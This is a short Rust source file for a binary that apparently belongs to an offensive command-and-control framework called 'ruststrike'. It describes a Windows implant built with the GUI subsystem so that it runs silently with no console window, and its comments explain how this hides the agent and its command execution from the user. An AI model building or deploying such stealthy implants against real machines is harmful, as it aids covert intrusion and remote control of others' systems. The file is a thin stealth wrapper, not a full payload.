//! ruststrike-implant-silent: GUI-subsystem Windows implant.
//!
//! Identical to `ruststrike-implant` (same lib, same loader, same stealth
//! layer) but built with the **Windows GUI subsystem** — so launching it does
//! NOT allocate a console window. Combined with the command-exec BOFs already
//! spawning their children with `CREATE_NO_WINDOW`, the whole agent runs
//! silently in the background: "click to run" produces no visible cmd window.
//!
//! `#![windows_subsystem = "windows"]` is the only difference from the console
//! bin. It must be the first item in the crate root. A GUI-subsystem `fn main`
//! still works (Rust provides the entry); no WinMain / message pump needed
//! because the implant never creates a window — it just connects and pumps
//! messages on threads like the console build.

#![windows_subsystem = "windows"]

fn main() -> anyhow::Result<()> {
    ruststrike_implant::run()
}
